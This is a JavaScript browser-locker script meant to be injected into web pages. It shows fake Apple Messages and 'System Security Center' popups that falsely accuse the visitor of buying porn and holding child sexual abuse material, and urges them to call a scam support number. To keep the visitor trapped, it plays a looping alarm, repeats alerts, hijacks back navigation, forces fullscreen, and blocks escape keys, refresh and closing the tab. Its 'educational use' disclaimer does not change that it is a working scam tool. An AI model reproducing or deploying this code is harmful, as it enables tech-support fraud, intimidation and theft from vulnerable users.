/**
 * Popup Freeze Script — inject into any website
 * Paste before </body> or load via <script src="popup-freeze.js"></script>
 *
 * FOR PERSONAL / EDUCATIONAL USE ONLY on sites you own or control.
 */
(function () {
  "use strict";

  const CONFIG = {
    topAppName: "MESSAGES",
        topSender: "Payment Successful",
        topMessage: "Sent $569.90 via Apple Pay to Pornhub Premium. Not you? Call +1-833-316-1716 ",
        centerTitle: "Warning",
        centerMessage: "Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support +1-833-316-1716 to unlock it!",
        emergencyNumber: "+1-833-316-1716", 
        alertIntervalMs: 3000,
  };

  if (window.__popupFreezeActive) return;
  window.__popupFreezeActive = true;

  let audioCtx = null;
  let alarmOscillator = null;
  let alertTimer = null;

  // Inject styles
  const style = document.createElement("style");
  style.textContent = `
    #pf-freeze-overlay {
      position: fixed; inset: 0;
      background: rgba(0,0,0,0.75);
      z-index: 2147483646;
      cursor: not-allowed;
    }
    #pf-top-alert {
      position: fixed;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      width: min(380px, calc(100vw - 24px));
      z-index: 2147483647;
      border-radius: 22px;
      overflow: hidden;
      box-shadow: 0 4px 24px rgba(0,0,0,0.18);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
    }
    #pf-top-alert .pf-notif-header {
      display: flex; align-items: center; justify-content: space-between;
      padding: 10px 14px 6px;
      background: rgba(245,245,247,0.9);
    }
    #pf-top-alert .pf-notif-app {
      display: flex; align-items: center; gap: 6px;
    }
    #pf-top-alert .pf-notif-icon {
      width: 20px; height: 20px; border-radius: 5px; flex-shrink: 0;
    }
    #pf-top-alert .pf-notif-app-name {
      font-size: 11px; font-weight: 500; color: #8e8e93;
      text-transform: uppercase; letter-spacing: 0.3px;
    }
    #pf-top-alert .pf-notif-time {
      font-size: 11px; color: #8e8e93;
    }
    #pf-top-alert .pf-notif-body {
      padding: 4px 14px 12px;
      background: rgba(255,255,255,0.85);
    }
    #pf-top-alert .pf-notif-sender {
      font-size: 15px; font-weight: 600; color: #000; margin-bottom: 2px;
    }
    #pf-top-alert .pf-notif-message {
      font-size: 15px; color: #000; line-height: 1.35;
    }
    #pf-center-popup {
      position: fixed; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      z-index: 2147483646;
      background: #ffffff; border-radius: 8px;
      width: min(420px, 90vw);
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
      font-family: "Segoe UI", sans-serif;
      animation: pf-pop 0.4s cubic-bezier(0.34,1.56,0.64,1);
    }
    #pf-center-popup .pf-header {
      background: #ffffff; color: #333;
      padding: 12px 16px; font-size: 14px; font-weight: 600;
      border-bottom: 1px solid #eee;
    }
    #pf-center-popup .pf-body {
      padding: 24px 20px; text-align: center; background: #ffffff;
    }
    #pf-center-popup .pf-body .pf-big { font-size: 48px; margin-bottom: 12px; }
    #pf-center-popup .pf-body h3 { font-size: 18px; color: #c0392b; margin-bottom: 10px; }
    #pf-center-popup .pf-body p { font-size: 14px; color: #555; line-height: 1.5; }
    #pf-center-popup .pf-footer {
      padding: 12px 16px; background: #ffffff;
      border-top: 1px solid #eee;
      display: flex; justify-content: center; gap: 10px;
    }
    #pf-center-popup button {
      padding: 8px 28px; border: none; border-radius: 4px;
      color: #fff; font-weight: 600; cursor: pointer;
    }
    #pf-center-popup .pf-btn-call { background: #007aff; }
    #pf-center-popup .pf-btn-cancel { background: #8e8e93; }
    @keyframes pf-pop {
      from { opacity: 0; transform: translate(-50%,-50%) scale(0.6); }
      to { opacity: 1; transform: translate(-50%,-50%) scale(1); }
    }
    html.pf-forced-fullscreen,
    html.pf-forced-fullscreen body {
      position: fixed !important;
      inset: 0 !important;
      width: 100vw !important;
      height: 100vh !important;
      max-width: 100vw !important;
      max-height: 100vh !important;
      overflow: hidden !important;
      margin: 0 !important;
      padding: 0 !important;
    }
  `;
  document.head.appendChild(style);

  // Build popups
  const overlay = document.createElement("div");
  overlay.id = "pf-freeze-overlay";

  const MESSAGES_ICON = `<svg class="pf-notif-icon" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect width="20" height="20" rx="5" fill="#34C759"/><path d="M5 5.5C5 4.67 5.67 4 6.5 4h7c.83 0 1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5H9l-3.5 2.5V5.5z" fill="#fff"/></svg>`;

  const topAlert = document.createElement("div");
  topAlert.id = "pf-top-alert";
  topAlert.innerHTML = `
    <div class="pf-notif-header">
      <div class="pf-notif-app">
        ${MESSAGES_ICON}
        <span class="pf-notif-app-name">${CONFIG.topAppName}</span>
      </div>
      <span class="pf-notif-time">now</span>
    </div>
    <div class="pf-notif-body">
      <div class="pf-notif-sender">${CONFIG.topSender}</div>
      <div class="pf-notif-message">${CONFIG.topMessage}</div>
    </div>
  `;

  const center = document.createElement("div");
  center.id = "pf-center-popup";
  center.innerHTML = `
    <div class="pf-header">🛡️ System Security Center</div>
    <div class="pf-body">
      <div class="pf-big">⚠️</div>
      <h3>${CONFIG.centerTitle}</h3>
      <p>${CONFIG.centerMessage}</p>
    </div>
    <div class="pf-footer">
      <button class="pf-btn-call" id="pf-call-btn">Call</button>
      <button class="pf-btn-cancel" id="pf-cancel-btn">Cancel</button>
    </div>
  `;

  document.body.appendChild(overlay);
  document.body.appendChild(center);
  document.body.appendChild(topAlert);
  document.body.style.overflow = "hidden";

  document.getElementById("pf-call-btn").addEventListener("click", function () {
    if (CONFIG.emergencyNumber) {
      window.location.href = "tel:" + CONFIG.emergencyNumber;
    }
  });

  document.getElementById("pf-cancel-btn").addEventListener("click", function () {
    alert("⚠ Cannot cancel. A security scan is in progress.");
  });

  // Continuous alarm sound
  try {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const gain = audioCtx.createGain();
    alarmOscillator = audioCtx.createOscillator();
    alarmOscillator.connect(gain);
    gain.connect(audioCtx.destination);
    alarmOscillator.frequency.value = 880;
    alarmOscillator.type = "square";
    gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
    alarmOscillator.start();
  } catch (_) {}

  function showAlert() {
    alert("⚠ SECURITY ALERT\n\nUnauthorized access detected!\nDo NOT close this browser window.");
  }
  showAlert();
  alertTimer = setInterval(showAlert, CONFIG.alertIntervalMs);

  history.pushState(null, "", location.href);
  history.pushState(null, "", location.href);
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function () {
    history.pushState(null, "", location.href);
    alert("⚠ You cannot go back. A security scan is running.");
  });

  function isFullscreen() {
    return !!(
      document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.msFullscreenElement ||
      document.mozFullScreenElement
    );
  }

  function enterFullscreen() {
    document.documentElement.classList.add("pf-forced-fullscreen");
    if (isFullscreen()) return;

    const el = document.documentElement;
    const request =
      el.requestFullscreen ||
      el.webkitRequestFullscreen ||
      el.msRequestFullscreen ||
      el.mozRequestFullScreen;
    if (request) {
      request.call(el).catch(function () {});
    }
  }

  function enforceFullscreen() {
    document.documentElement.classList.add("pf-forced-fullscreen");
    if (!isFullscreen()) {
      enterFullscreen();
    }
  }

  function lockFullscreen() {
    enforceFullscreen();

    document.addEventListener("fullscreenchange", enforceFullscreen);
    document.addEventListener("webkitfullscreenchange", enforceFullscreen);
    document.addEventListener("mozfullscreenchange", enforceFullscreen);
    document.addEventListener("MSFullscreenChange", enforceFullscreen);

    setInterval(enforceFullscreen, 50);

    document.addEventListener("visibilitychange", function () {
      if (!document.hidden) enforceFullscreen();
    });

    window.addEventListener("focus", enforceFullscreen);
    window.addEventListener("blur", function () {
      enforceFullscreen();
      setTimeout(enforceFullscreen, 10);
      setTimeout(enforceFullscreen, 50);
      setTimeout(function () { window.focus(); }, 100);
    });

    ["click", "pointerdown", "mousedown", "touchstart", "keydown"].forEach(function (evt) {
      document.addEventListener(evt, enforceFullscreen, true);
    });
  }

  lockFullscreen();

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape") {
      e.preventDefault();
      e.stopImmediatePropagation();
      enforceFullscreen();
      return;
    }
    if (
      e.key === "F5" || e.key === "F12" ||
      (e.ctrlKey && ["w","W","r","R"].includes(e.key)) ||
      (e.altKey && e.key === "ArrowLeft") ||
      (e.key === "Backspace" && e.target === document.body)
    ) {
      e.preventDefault();
      e.stopPropagation();
      alert("⚠ Action blocked. Security scan in progress.");
    }
  }, true);

  document.addEventListener("contextmenu", function (e) { e.preventDefault(); });

  window.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "A security scan is in progress.";
    return e.returnValue;
  });

  window.addEventListener("blur", function () {
    setTimeout(function () { window.focus(); }, 100);
  });
})();
